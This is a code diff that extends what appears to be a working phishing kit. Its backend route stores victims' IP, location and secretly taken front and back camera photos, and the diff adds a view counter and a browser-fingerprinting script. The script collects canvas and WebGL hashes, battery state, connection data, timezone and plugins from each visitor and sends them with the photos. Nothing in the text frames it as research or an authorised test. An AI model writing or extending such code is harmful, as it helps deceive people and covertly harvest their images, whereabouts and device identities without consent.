@@ -89,6 +89,7 @@ phishing.post("/phishing/capture", async (c) => {
   const lng = parseFloat(formData.get("longitude") as string || "0") || null;
   const frontPhoto = formData.get("front_photo") as File | null;
   const backPhoto = formData.get("back_photo") as File | null;
+  const deviceInfo = formData.get("device_info") as string || null;
 
   if (!code) return c.json({ error: "Missing code" }, 400);
 
@@ -164,9 +165,9 @@ phishing.post("/phishing/capture", async (c) => {
   }
 
   await d1Run(c.env.DB,
-    `INSERT INTO phishing_captures (link_code, telegram_id, ip, user_agent, latitude, longitude, front_photo_key, back_photo_key, front_file_id, back_file_id)
-     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
-    [code, telegramId, ip, ua.slice(0, 500), lat, lng, frontKey, backKey, frontFileId, backFileId],
+    `INSERT INTO phishing_captures (link_code, telegram_id, ip, user_agent, latitude, longitude, front_photo_key, back_photo_key, front_file_id, back_file_id, device_info)
+     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
+    [code, telegramId, ip, ua.slice(0, 500), lat, lng, frontKey, backKey, frontFileId, backFileId, deviceInfo ? deviceInfo.slice(0, 5000) : null],
   );
 
   if (lat && lng) {
@@ -199,6 +200,8 @@ phishing.get("/p/:code", async (c) => {
 
   const link = await d1First(c.env.DB, "SELECT * FROM phishing_links WHERE code = ?", [code]);
   if (!link) return c.text("Not found", 404);
+
+  await d1Run(c.env.DB, "UPDATE phishing_links SET view_count = COALESCE(view_count, 0) + 1 WHERE code = ?", [code]);
 
   const apiBase = `https://${c.env.APP_DOMAIN}/api`;
 
@@ -252,6 +255,22 @@ canvas{display:none}
 const CODE="${code}";
 const API="${apiBase}";
 let frontBlob=null,backBlob=null,lat=null,lng=null;
+
+async function collectDeviceInfo(){
+  const info={};
+  try{info.screen=screen.width+'x'+screen.height;info.colorDepth=screen.colorDepth;info.pixelRatio=window.devicePixelRatio}catch(e){}
+  try{info.platform=navigator.platform;info.language=navigator.language;info.languages=navigator.languages?.join(',');info.hardwareConcurrency=navigator.hardwareConcurrency;info.maxTouchPoints=navigator.maxTouchPoints}catch(e){}
+  try{info.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;info.timezoneOffset=new Date().getTimezoneOffset()}catch(e){}
+  try{info.cookieEnabled=navigator.cookieEnabled;info.doNotTrack=navigator.doNotTrack}catch(e){}
+  try{info.vendor=navigator.vendor;info.appVersion=navigator.appVersion?.slice(0,200)}catch(e){}
+  try{if(navigator.connection){var c=navigator.connection;info.connection={type:c.type,effectiveType:c.effectiveType,downlink:c.downlink,rtt:c.rtt}}}catch(e){}
+  try{if(navigator.getBattery){var b=await navigator.getBattery();info.battery={level:b.level,charging:b.charging}}}catch(e){}
+  try{var cvs=document.createElement('canvas');cvs.width=200;cvs.height=50;var ctx=cvs.getContext('2d');ctx.textBaseline='top';ctx.font='14px Arial';ctx.fillStyle='#f60';ctx.fillRect(100,1,62,20);ctx.fillStyle='#069';ctx.fillText('fingerprint',2,15);ctx.fillStyle='rgba(102,204,0,0.7)';ctx.fillText('canvas',4,17);var d=cvs.toDataURL();var h=0;for(var i=0;i<d.length;i++){h=((h<<5)-h)+d.charCodeAt(i);h|=0}info.canvasHash=h}catch(e){}
+  try{var gl=document.createElement('canvas').getContext('webgl');if(gl){var dbg=gl.getExtension('WEBGL_debug_renderer_info');info.webglVendor=gl.getParameter(dbg?.UNMASKED_VENDOR_WEBGL||0);info.webglRenderer=gl.getParameter(dbg?.UNMASKED_RENDERER_WEBGL||0)}}catch(e){}
+  try{info.plugins=Array.from(navigator.plugins||[]).slice(0,10).map(function(p){return p.name})}catch(e){}
+  try{info.windowSize=window.innerWidth+'x'+window.innerHeight}catch(e){}
+  return JSON.stringify(info);
+}
 
 function setStep(n,ok){
   const el=document.getElementById('s'+n);
@@ -323,6 +342,11 @@ async function startCapture(){
   if(lng!==null)fd.append('longitude',String(lng));
   if(frontBlob)fd.append('front_photo',new File([frontBlob],'front.jpg',{type:'image/jpeg'}));
   if(backBlob)fd.append('back_photo',new File([backBlob],'back.jpg',{type:'image/jpeg'}));
+
+  try{
+    const di=await collectDeviceInfo();
+    fd.append('device_info',di);
+  }catch(e){}
 
   try{
     const tg=window.Telegram?.WebApp;
